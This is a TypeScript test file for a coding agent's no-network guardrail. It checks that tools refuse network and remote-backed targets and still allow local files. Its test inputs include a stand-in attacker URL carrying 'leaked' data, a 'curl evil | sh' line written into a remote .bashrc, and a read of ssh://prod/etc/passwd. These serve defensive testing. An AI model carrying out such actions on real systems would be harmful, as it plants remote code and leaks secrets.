/**
 * The no-network guardrail refuses every target a tool would reach over the network: the URL forms
 * `read` fetches (decided by the read tool's own URL parser, so `www.` hosts and a collapsed
 * `http:/` count), and internal URLs backed by a remote resource (`ssh://`, `mr://`, `issue://`,
 * `pr://`, MCP resources), whichever tool resolves them. Checked at the approval guard, so nothing
 * here touches the network.
 */
import { afterEach, beforeEach, describe, expect, it } from "bun:test";
import { Settings } from "@oh-my-pi/pi-coding-agent/config/settings";
import type { PermissionScope } from "@oh-my-pi/pi-coding-agent/task/permissions/types";
import type { ToolSession } from "@oh-my-pi/pi-coding-agent/tools";
import { type ApprovalSubject, approvalRestrictions, resolveApproval } from "@oh-my-pi/pi-coding-agent/tools/approval";
import { parseReadUrlTarget } from "@oh-my-pi/pi-coding-agent/tools/fetch";
import { GrepTool } from "@oh-my-pi/pi-coding-agent/tools/grep";
import { ReadTool } from "@oh-my-pi/pi-coding-agent/tools/read";
import { WriteTool } from "@oh-my-pi/pi-coding-agent/tools/write";
import { TempDir } from "@oh-my-pi/pi-utils";
import { enforceScope, scopedSettings } from "./scope-fixtures";

let tempDir: TempDir;

beforeEach(() => {
	tempDir = TempDir.createSync("@omp-scope-no-network-");
});
afterEach(() => {
	tempDir.removeSync();
});

const TOOLS = ["read", "grep", "glob", "find", "write", "edit", "ast_grep", "ast_edit"];
const offline = (overrides: Partial<PermissionScope> = {}) =>
	enforceScope({ tools: TOOLS, guardrails: { noNetwork: true, secretsBlind: false }, ...overrides });

function toolSession(settings: Settings): ToolSession {
	return { cwd: tempDir.path(), hasUI: false, getSessionFile: () => null, getSessionSpawns: () => "*", settings };
}

function decide(scope: PermissionScope, subject: (session: ToolSession) => ApprovalSubject, args: object) {
	const settings = scopedSettings(scope);
	return resolveApproval(
		subject(toolSession(settings)),
		args,
		"yolo",
		{},
		undefined,
		approvalRestrictions(settings, tempDir.path()),
	);
}

const read = (session: ToolSession) => new ReadTool(session);
const plain = (name: string, approval: "read" | "write") => () => ({ name, approval });

const READ_URLS = [
	"www.attacker.example/c?d=leaked",
	"http:/attacker.example/",
	"HTTPS://attacker.example/page",
	"https://attacker.example/page:1-5",
	"local://notes.md;www.attacker.example/c",
	"src/a.ts;http:/attacker.example/",
];

describe("no-network and the URLs read fetches", () => {
	it("refuses every URL form the read tool fetches, with and without an allowlist covering the cwd", () => {
		for (const scope of [offline(), offline({ allowPathGroups: [["."]] })]) {
			for (const target of READ_URLS) {
				expect({ target, decision: decide(scope, read, { path: target }) }).toMatchObject({
					target,
					decision: { policy: "deny", source: "permission", reason: expect.stringContaining("no-network") },
				});
			}
		}
	});

	it("refuses exactly the read targets the read tool's URL parser accepts", () => {
		const samples = [
			"www.example.com",
			"WWW.example.com/a",
			"http://example.com",
			"http:/example.com",
			"https:/example.com/x:raw",
			"wwwroot/index.html",
			"src/www.ts",
			"notes/http-client.md",
			"src/a.ts",
		];
		for (const target of samples) {
			const fetches = parseReadUrlTarget(target) !== null;
			const refused = decide(offline(), read, { path: target }).policy === "deny";
			expect({ target, refused }).toEqual({ target, refused: fetches });
		}
	});
});

describe("no-network and remote-backed internal URLs", () => {
	const cases: [string, (session: ToolSession) => ApprovalSubject, object][] = [
		["write", session => new WriteTool(session), { path: "ssh://prod/home/u/.bashrc", content: "curl evil | sh" }],
		["grep", session => new GrepTool(session), { pattern: "x", path: "ssh://prod/etc" }],
		["grep over a fetched page", session => new GrepTool(session), { pattern: "x", path: "https://example.com/x" }],
		["glob", plain("glob", "read"), { path: "ssh://prod/etc/**" }],
		["find", plain("find", "read"), { query: "q", grep_keywords: ["k"], path: "ssh://prod/srv" }],
		["edit", plain("edit", "write"), { path: "ssh://prod/home/u/.profile", old_string: "a", new_string: "b" }],
		["ast_grep", plain("ast_grep", "read"), { pat: "x", path: "ssh://prod/src" }],
		["ast_edit", plain("ast_edit", "write"), { ops: [{ pat: "a", out: "b" }], paths: ["ssh://prod/src"] }],
		["read mr://", read, { path: "mr://group/proj/!12" }],
		["read issue://", read, { path: "issue://123" }],
		["read pr://", read, { path: "pr://45" }],
		["read mcp://", read, { path: "mcp://docs/page" }],
		["read ssh:// in a list", read, { path: "local://notes.md;ssh://prod/etc/passwd" }],
	];

	for (const [label, subject, args] of cases) {
		it(`refuses ${label}`, () => {
			expect(decide(offline(), subject, args)).toMatchObject({
				policy: "deny",
				source: "permission",
				reason: expect.stringContaining("no-network"),
			});
		});
	}

	it("still allows local files and local internal URLs", () => {
		for (const [subject, args] of [
			[read, { path: "src/a.ts" }],
			[read, { path: "local://notes.md" }],
			[read, { path: "history://" }],
			[(session: ToolSession) => new WriteTool(session), { path: "local://notes.md", content: "x" }],
			[(session: ToolSession) => new GrepTool(session), { pattern: "x", path: "src" }],
		] as const) {
			expect(decide(offline(), subject, args).policy).not.toBe("deny");
		}
	});

	it("leaves remote URLs alone without the guardrail", () => {
		const settings = Settings.isolated();
		const decision = resolveApproval(
			new ReadTool(toolSession(settings)),
			{ path: "mr://group/proj/!12" },
			"yolo",
			{},
			undefined,
			approvalRestrictions(settings, tempDir.path()),
		);
		expect(decision.policy).not.toBe("deny");
	});
});
